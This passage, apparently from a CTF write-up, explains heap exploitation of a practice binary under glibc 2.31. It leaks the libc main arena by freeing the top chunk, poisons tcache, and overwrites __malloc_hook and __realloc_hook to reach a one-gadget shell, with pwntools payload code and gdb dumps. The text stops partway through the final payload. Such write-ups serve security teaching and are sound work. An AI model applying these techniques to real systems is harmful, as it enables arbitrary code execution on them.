</span></code></pre></div>
<p>In our example, the size we want to overwrite into is <code>0xc00</code>:</p>
<p><img src="/static/images/mocsctf-2022/Technique_malloc4.png" alt="Technique_malloc4.png"/></p>
<p>Address <code>0x55555555b000</code> can satisfy the alignment so we will change top chunk size from 0x20c00 to 0xc00 with the <code>PREV_INUSE</code> bit is set.</p>
<p><img src="/static/images/mocsctf-2022/Technique_malloc2.png" alt="Technique_malloc2.png"/></p>
<p>So that when we malloc with a large number <code>malloc(0x1000)</code>, that top chunk cannot satisfy our malloc. Then that top chunk will be freed without any error:</p>
<p><img src="/static/images/mocsctf-2022/Technique_malloc3.png" alt="Technique_malloc3.png"/></p>
<p>Because top chunk size is 0xc00, which is large. So when top chunk is freed, it goes to unsorted bin.</p>
<p>So if our top chunk size is small enough, which fit size of tcache, when we use this technique to free the top chunk, it will go to tcache bin. That’s sound interesting, right?</p>
<ul>
<li>Summary technique:<!-- -->
<ol>
<li>We can malloc maximum 0x1000 bytes</li>
<li>Malloc chunk larger than top chunk will free that top chunk</li>
<li>Overwriting top chunk size require 2 constraints:<!-- -->
<ul>
<li>The size of top chunk need to be aligned with size of 0x1000<br/>
<code>(top chunk address + top chunk size) % 0x1000 == 0</code></li>
<li>The <code>PREV_INUSE</code> bit need to be set</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="brainstorming"><a href="#brainstorming" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Brainstorming</h3>
<p>With the origin House of Orange, it first frees the top chunk, then fake the <code>_IO_list_all</code> so that when we malloc again, it will execute <code>_IO_list_all</code> with string <code>/bin/sh</code>. But that’s just for libc ≤ 2.23 because those libc from ≥ 2.24, the check is changed, faking <code>_IO_list_all</code> is not successful anymore.</p>
<p>Because our provided libc is 2.31, we still can free the top chunk. First we make a large top chunk, then free it and we get libc main arena address. Next we will free 2 times with 2 small top chunk. So that those small top chunk can go to tcache bin (libc ≥ 2.28 has tcache enabled).</p>
<p>And then, we abuse the tcache link list by overwriting the forward pointer to whatever we want and we get the shell.</p>
<ul>
<li>Summary:<!-- -->
<ol>
<li>Leak main arena address</li>
<li>Free 2 small chunks</li>
<li>Get shell</li>
</ol>
</li>
</ul>
<h2 id="3-exploit"><a href="#3-exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>3. Exploit</h2>
<p>Before we start our exploitation, I wrote these function to help our exploit more convenient</p>
<details><summary>Code snippet</summary><p><div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">getchar</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">  <span class="token keyword">return</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}=malloc({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">gets</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;gets({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">  time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
</span><span class="code-line">  p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">puts</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;puts({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">  <span class="token comment"># Receive data outside</span>
</span></code></pre></div></p></details>
<p>And now let’s start!</p>
<h3 id="stage-1-leak-main-arena-address"><a href="#stage-1-leak-main-arena-address" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 1: Leak main arena address</h3>
<p>At first, we will need a chunk with index 0 (means <code>A</code> because we use the <code>getchar()</code> function to turn index to char) with any size so that we can overwrite all the next chunk with just chunk <code>A</code>:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">malloc(0, 0x10)
</span></code></pre></div>
<p>Let’s see where our chunk <code>A</code> is saved on stack after a first malloc:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffe68571be0│+0x0000: &quot;A=malloc(16)\n&quot;   ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffe68571be8│+0x0008: 0x0000000a29363128 (&quot;(16)\n&quot;?)
</span><span class="code-line">0x00007ffe68571bf0│+0x0010: 0x0000564641e852a0  →  0x0000000000000000    # Chunk index 0
</span><span class="code-line">0x00007ffe68571bf8│+0x0018: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c00│+0x0020: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c08│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c10│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c18│+0x0038: 0x0000000000000000
</span><span class="code-line">...
</span></code></pre></div>
<p>So it will save our malloc address from chunk <code>A</code> to chunk <code>Z</code> down of the stack like that. Let’s check the top chunk size:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/20xg 0x0000564641e852a0-0x10
</span><span class="code-line">0x564641e85290: 0x0000000000000000  0x0000000000000021    &lt;-- Chunk index 0
</span><span class="code-line">0x564641e852a0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852b0: 0x0000000000000000  0x0000000000020d51    &lt;-- Top chunk
</span><span class="code-line">0x564641e852c0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852d0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852e0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852f0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e85300: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e85310: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e85320: 0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>So our top chunk size now is <code>0x20d51</code> with the <code>PREV_INUSE</code> bit set. If we want to free that top chunk using the above technique (malloc a chunk larger than top chunk), we need to make our top chunk to be smaller because we can only malloc maximum 0x1000, which means we need to malloc around 20 chunks with size 0x1000. That would be long.</p>
<p>So we will change the top chunk size with the <strong>Heap Overflow</strong> bug. Remember that our top chunk is aligned with 0x1000 so we need to calculate the top chunk size first:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x55fad6324000 - 0x55fad63232b0 = 0xd050
</span></code></pre></div>
<p>So overwriting <code>0xd051</code> (with <code>PREV_INUSE</code> bit) to top chunk size and malloc <code>0x1000</code> byte will free our top chunk. Code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Change topchunk size</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x10</span>    <span class="token comment"># chunk data</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x8</span>    <span class="token comment"># Prevsize</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xd51</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Malloc 0x1000 bytes</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>After overwrite top chunk size:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/10xg 0x0000564641e852a0-0x10
</span><span class="code-line">0x564641e85290: 0x0000000000000000  0x0000000000000021
</span><span class="code-line">0x564641e852a0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852b0: 0x0000000000000000  0x0000000000000d51
</span><span class="code-line">0x564641e852c0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852d0: 0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>After <code>malloc(0x1000)</code>:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/10xg 0x0000564641e852a0-0x10
</span><span class="code-line">0x564641e85290: 0x0000000000000000  0x0000000000000021
</span><span class="code-line">0x564641e852a0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x564641e852b0: 0x0000000000000000  0x0000000000000d31
</span><span class="code-line">0x564641e852c0: 0x00007fb00a6b0be0  0x00007fb00a6b0be0
</span><span class="code-line">0x564641e852d0: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">
</span><span class="code-line">gef➤  heap bin
</span><span class="code-line">────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────
</span><span class="code-line">All tcachebins are empty
</span><span class="code-line">───────────────────────────── Fastbins for arena 0x7fb00a6b0b80 ─────────────────────────────
</span><span class="code-line">Fastbins[idx=0, size=0x20] 0x00
</span><span class="code-line">Fastbins[idx=1, size=0x30] 0x00
</span><span class="code-line">Fastbins[idx=2, size=0x40] 0x00
</span><span class="code-line">Fastbins[idx=3, size=0x50] 0x00
</span><span class="code-line">Fastbins[idx=4, size=0x60] 0x00
</span><span class="code-line">Fastbins[idx=5, size=0x70] 0x00
</span><span class="code-line">Fastbins[idx=6, size=0x80] 0x00
</span><span class="code-line">──────────────────────────── Unsorted Bin for arena &#x27;main_arena&#x27; ────────────────────────────
</span><span class="code-line">[+] unsorted_bins[0]: fw=0x564641e852b0, bk=0x564641e852b0
</span><span class="code-line"> →   Chunk(addr=0x564641e852c0, size=0xd30, flags=PREV_INUSE)
</span><span class="code-line">[+] Found 1 chunks in unsorted bin.
</span><span class="code-line">───────────────────────────── Small Bins for arena &#x27;main_arena&#x27; ─────────────────────────────
</span><span class="code-line">[+] Found 0 chunks in 0 small non-empty bins.
</span><span class="code-line">───────────────────────────── Large Bins for arena &#x27;main_arena&#x27; ─────────────────────────────
</span><span class="code-line">[+] Found 0 chunks in 0 large non-empty bins.
</span><span class="code-line">
</span></code></pre></div>
<p>We can see that the top chunk is freed and goes into unsorted bin. At here, the program write libc main arena to that chunk so we can see stuff at that freed top chunk. The address for the <code>malloc(0x1000)</code> is placed in the next page and saved in the stack like this:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffe68571be0│+0x0000: &quot;B=malloc(4096)\n&quot;   ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffe68571be8│+0x0008: &quot;(4096)\n&quot;
</span><span class="code-line">0x00007ffe68571bf0│+0x0010: 0x0000564641e852a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffe68571bf8│+0x0018: 0x0000564641ea6010  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffe68571c00│+0x0020: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c08│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c10│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffe68571c18│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>So now, let’s leak the libc main arena address in the freed top chunk first. To do that, we just simply malloc an amount which is smaller than freed top chunk (which turn into unsorted bin) because malloc() doesn’t remove data on that chunk (just free() does), and then print the libc main arena address out (Address changed because I rerun it):</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">malloc(2, 0x100)
</span><span class="code-line">puts(2)
</span></code></pre></div>
<p>Running it and we get the libc main arena address leaked:</p>
<p><img src="/static/images/mocsctf-2022/libc_main_arena_address_leaked.png" alt="libc_main_arena_address_leaked.png"/></p>
<p>Stack contain the chunk with index 2:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffe5fd1bc90│+0x0000: &quot;puts(C)\n&quot;  ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffe5fd1bc98│+0x0008: 0x00000a2936353200
</span><span class="code-line">0x00007ffe5fd1bca0│+0x0010: 0x0000555ddbd4f2a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffe5fd1bca8│+0x0018: 0x0000555ddbd70010  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffe5fd1bcb0│+0x0020: 0x0000555ddbd4f2c0  →  0x00007f416cfea1e0    &lt;-- Chunk index 2
</span><span class="code-line">0x00007ffe5fd1bcb8│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007ffe5fd1bcc0│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffe5fd1bcc8│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>Compared with chunk 2 data and we know it’s correct. Now we will do a simple calculation to get the offset between that leaked address with libc base address. We can get libc base address using <code>vmmap</code> (for gdb-gef I think so)</p>
<p><img src="/static/images/mocsctf-2022/vmmap_libc_base.png" alt="vmmap_libc_base.png"/></p>
<p>So the libc base address is <code>0x00007f416cdfe000</code>, the leaked address is <code>0x00007f416cfea1e0</code>, the offset will be:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007f416cfea1e0 - 0x00007f416cdfe000 = 0x1ec1e0
</span></code></pre></div>
<p>So every time we get the leaked libc main arena address, we just subtract with this offset and we have the libc base address. That’s great for now! Let’s move on the second stage: Free 2 small chunks!</p>
<h3 id="stage-2-free-2-small-chunks"><a href="#stage-2-free-2-small-chunks" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 2: Free 2 small chunks</h3>
<p>Now, we will continue using the above technique to free 2 top chunk with small size. Do you still remember we have already chunk index 1 which in the new page of heap? This time, we will reuse that to overwrite the new top chunk size again.</p>
<p>Before we do that, let’s see the new top chunk size next to chunk 1. Because I re-run program so address changed. This is new stack address:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffec709f4d0│+0x0000: &quot;puts(C)\n&quot;  ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffec709f4d8│+0x0008: 0x00000a2936353200
</span><span class="code-line">0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffec709f4e8│+0x0018: 0x0000557c12fc1010  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffec709f4f0│+0x0020: 0x0000557c12fa02c0  →  0x00007f5c373161e0    &lt;-- Chunk index 2
</span><span class="code-line">0x00007fffcd05f248│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007fffcd05f250│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007fffcd05f258│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>So new top chunk size now is:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  # x/4xg &lt;chunk index 1&gt; + 0x1000
</span><span class="code-line">gef➤  x/4xg 0x000055cb4beae010 + 0x1000
</span><span class="code-line">0x557c12fc2010: 0x0000000000000000  0x0000000000020ff1
</span><span class="code-line">0x557c12fc2020: 0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>We need to make top chunk size smaller such as 0x300, so we need to malloc another chunk with the size <code>0xcf0</code> with this calculation:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0xff1 - 0x300 - 0xcf1
</span></code></pre></div>
<p>We will want to malloc <code>0xcf0-0x10</code> because there is heap metadata, so if we <code>malloc(0xcf0)</code>, the total size will be <code>0xcf0 + 0x10 = 0xd00</code>:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">malloc(1, 0xcf0-0x10)
</span></code></pre></div>
<p>Why I use index 1? Just because we don’t use those 0x1000 byte of chunk 1 anymore so we reuse index 1 again. After <code>malloc(1, 0xcf0-0x10)</code>, the stack where chunk 1 is placed changed:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffec709f4d0│+0x0000: &quot;B=malloc(3296)\n&quot;   ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffec709f4d8│+0x0008: &quot;(3296)\n&quot;
</span><span class="code-line">0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffec709f4e8│+0x0018: 0x0000557c12fc2020  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffec709f4f0│+0x0020: 0x0000557c12fa02c0  →  0x00007f5c373161e0    &lt;-- Chunk index 2
</span><span class="code-line">0x00007ffec709f4f8│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007ffec709f500│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffec709f508│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>Let’s check if our top chunk size if changed correctly:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/4xg 0x0000557c12fc2020 + (0xcf0 - 0x10)
</span><span class="code-line">0x557c12fc2d00: 0x0000000000000000  0x0000000000020301
</span><span class="code-line">0x557c12fc2d10: 0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>So now we just need to change top chunk size, then <code>malloc(0x1000)</code> again and we have a 0x300-byte chunk is freed:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Change top chunk size</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span>               <span class="token comment"># Remember PREV_INUSE bit</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Trigger to free top chunk</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Do you notice why I use chunk 2 to trigger to free top chunk? Because after we trigger that, the top chunk will go to tcache. So with the remain of chunk 1 address, we can control the freed top chunk.</p>
<p>Running script and we get our first freed chunk in tcache:</p>
<p><img src="/static/images/mocsctf-2022/free_topchunk_into_tcache1.png" alt="free_topchunk_into_tcache1.png"/></p>
<p>So with the chunk 2, we will do the same as chunk 1 to get the second freed chunk:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Change top chunk size to 0x20300</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Overwrite top chunk size to 0x300</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Trigger to free top chunk</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>And we get the second freed chunk in tcache:</p>
<p><img src="/static/images/mocsctf-2022/free_topchunk_into_tcache2.png" alt="free_topchunk_into_tcache2.png"/></p>
<p>With 2 freed chunk in tcache, we are very closed to the shell. Let’s move on final stage: Get shell!</p>
<h3 id="stage-3-get-shell"><a href="#stage-3-get-shell" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 3: Get shell</h3>
<p>This time, we will abuse tcache link list by changing forward pointer to whatever place we want. But first, let’s find a one gadget that we can use:</p>
<p><img src="/static/images/mocsctf-2022/one_gadget.png" alt="one_gadget.png"/></p>
<p>We will use the first one, which has constraints is r15 and r12 is null. Because if we changed <code>__malloc_hook</code> once, it can hardly be recovered to malloc() again. So this is a one hit one kill situation.</p>
<p>The idea is to overwrite <code>__malloc_hook</code> with realloc() and overwrite <code>__realloc_hook</code> with one gadget. The aim is to <code>pop</code> null byte to r15 and r12. At the epilouge of realloc(), there is <code>pop r12</code> and <code>pop r15</code>. So that’s why we will jump to realloc first. This is the assembly code of realloc:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  disas realloc
</span><span class="code-line">Dump of assembler code for function __GI___libc_realloc:
</span><span class="code-line">   0x00007f5c371c8000 &lt;+0&gt;:   endbr64
</span><span class="code-line">   0x00007f5c371c8004 &lt;+4&gt;:   push   r15
</span><span class="code-line">   0x00007f5c371c8006 &lt;+6&gt;:   push   r14
</span><span class="code-line">   0x00007f5c371c8008 &lt;+8&gt;:   push   r13
</span><span class="code-line">   0x00007f5c371c800a &lt;+10&gt;:  push   r12
</span><span class="code-line">   0x00007f5c371c800c &lt;+12&gt;:  mov    r12,rsi
</span><span class="code-line">   0x00007f5c371c800f &lt;+15&gt;:  push   rbp
</span><span class="code-line">   0x00007f5c371c8010 &lt;+16&gt;:  mov    rbp,rdi
</span><span class="code-line">   0x00007f5c371c8013 &lt;+19&gt;:  push   rbx
</span><span class="code-line">   0x00007f5c371c8014 &lt;+20&gt;:  sub    rsp,0x18
</span><span class="code-line">   0x00007f5c371c8018 &lt;+24&gt;:  mov    rax,QWORD PTR [rip+0x14cfc1]        # 0x7f5c37314fe0
</span><span class="code-line">   0x00007f5c371c801f &lt;+31&gt;:  mov    rax,QWORD PTR [rax]
</span><span class="code-line">
</span><span class="code-line">   0x00007f5c371c8022 &lt;+34&gt;:  test   rax,rax                             # Check if __realloc_hook is null or not
</span><span class="code-line">   0x00007f5c371c8025 &lt;+37&gt;:  jne    0x7f5c371c8260 &lt;__GI___libc_realloc+608&gt;
</span><span class="code-line">
</span><span class="code-line">   ...
</span><span class="code-line">
</span><span class="code-line">   0x00007f5c371c8260 &lt;+608&gt;: mov    rdx,QWORD PTR [rsp+0x48]
</span><span class="code-line">   0x00007f5c371c8265 &lt;+613&gt;: add    rsp,0x18
</span><span class="code-line">   0x00007f5c371c8269 &lt;+617&gt;: pop    rbx
</span><span class="code-line">   0x00007f5c371c826a &lt;+618&gt;: pop    rbp
</span><span class="code-line">   0x00007f5c371c826b &lt;+619&gt;: pop    r12
</span><span class="code-line">   0x00007f5c371c826d &lt;+621&gt;: pop    r13
</span><span class="code-line">   0x00007f5c371c826f &lt;+623&gt;: pop    r14
</span><span class="code-line">   0x00007f5c371c8271 &lt;+625&gt;: pop    r15
</span><span class="code-line">   0x00007f5c371c8273 &lt;+627&gt;: jmp    rax
</span><span class="code-line">
</span></code></pre></div>
<p>So in our case that <code>__realloc_hook</code> is not null (we will overwrite with one gadget), it then <code>pop</code> and execute the function inside <code>__realloc_hook</code>. So if we overwrite <code>__malloc_hook</code> with <code>realloc + 24</code> (address is <code>0x00007f5c371c8018</code>), which means we don’t push any register, but we can pop all 6 value on stack in to rbx, rbp, r12, r13, r14, r15, and also the stack didn’t change, we can control it more easily. And here is the status of stack:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffec709f4d0│+0x0000: &quot;D=malloc(4096)\n&quot;   ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffec709f4d8│+0x0008: &quot;(4096)\n&quot;
</span><span class="code-line">0x00007ffec709f4e0│+0x0010: 0x0000557c12fa02a0  →  0x0000000000000000
</span><span class="code-line">0x00007ffec709f4e8│+0x0018: 0x0000557c12fc2020  →  0x0000000000000000
</span><span class="code-line">0x00007ffec709f4f0│+0x0020: 0x0000557c12fe4020  →  0x0000000000000000
</span><span class="code-line">0x00007ffec709f4f8│+0x0028: 0x0000557c13005010  →  0x0000000000000000
</span><span class="code-line">0x00007ffec709f500│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffec709f508│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>So if we successfully pop 6 register, those register will be changed! And we know that we can create chunk with index up to 25 so just simply malloc with the larger index, r12 and r15 will contain 0 after that 6 pop.</p>
<p>And there is one more thing to notice:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  p&amp;__realloc_hook
</span><span class="code-line">$1 = (void *(**)(void *, size_t, const void *)) 0x7f5c37315b68 &lt;__realloc_hook&gt;
</span><span class="code-line">
</span><span class="code-line">gef➤  x/xg 0x7f5c37315b68
</span><span class="code-line">0x7f5c37315b68 &lt;__realloc_hook&gt;:  0x00007f5c371c7bf0
</span><span class="code-line">
</span><span class="code-line">gef➤  x/xg 0x7f5c37315b68 + 0x8
</span><span class="code-line">0x7f5c37315b70 &lt;__malloc_hook&gt;: 0x0000000000000000
</span><span class="code-line">
</span><span class="code-line">gef➤  x/2xg 0x7f5c37315b68
</span><span class="code-line">0x7f5c37315b68 &lt;__realloc_hook&gt;:  0x00007f5c371c7bf0  0x0000000000000000
</span><span class="code-line">                                  (__realloc_hook)     (__malloc_hook)
</span></code></pre></div>
<p>That means <code>__realloc_hook</code> and <code>__malloc_hook</code> is next to each other. So we can overwrite 2 of them at the same time easily. So that’s the idea. Now we start our final stage!</p>
<p>At the stage 2, we have chunk index 2 has size of 0xcf0, next to chunk 2 is the freed top chunk contain the forward pointer and backward pointer due to tcache link list:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/10xg 0x0000557c12fe4020 - 0x10
</span><span class="code-line">0x557c12fe4010: 0x0000000000000000  0x0000000000000cf1    &lt;-- Chunk index 2
</span><span class="code-line">0x557c12fe4020: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x557c12fe4030: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x557c12fe4040: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x557c12fe4050: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">
</span><span class="code-line">gef➤  x/10xg 0x0000557c12fe4020 - 0x10 + 0xcf0
</span><span class="code-line">0x557c12fe4d00: 0x0000000000000000  0x00000000000002e1    &lt;-- Second freed top chunk
</span><span class="code-line">0x557c12fe4d10: 0x0000557c12fc2d10  0x0000557c12fa0010
</span><span class="code-line">0x557c12fe4d20: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x557c12fe4d30: 0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x557c12fe4d40: 0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>Notice that the freed top chunk size changed to <code>0x2e1</code>. So now we overwrite forward pointer with <code>__realloc_hook</code>, just keep the same size as <code>0x2e0</code> to make sure there’s no error (address changed):</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>    <span class="token comment"># Prevsize</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x2e1</span><span class="token punctuation">)</span>
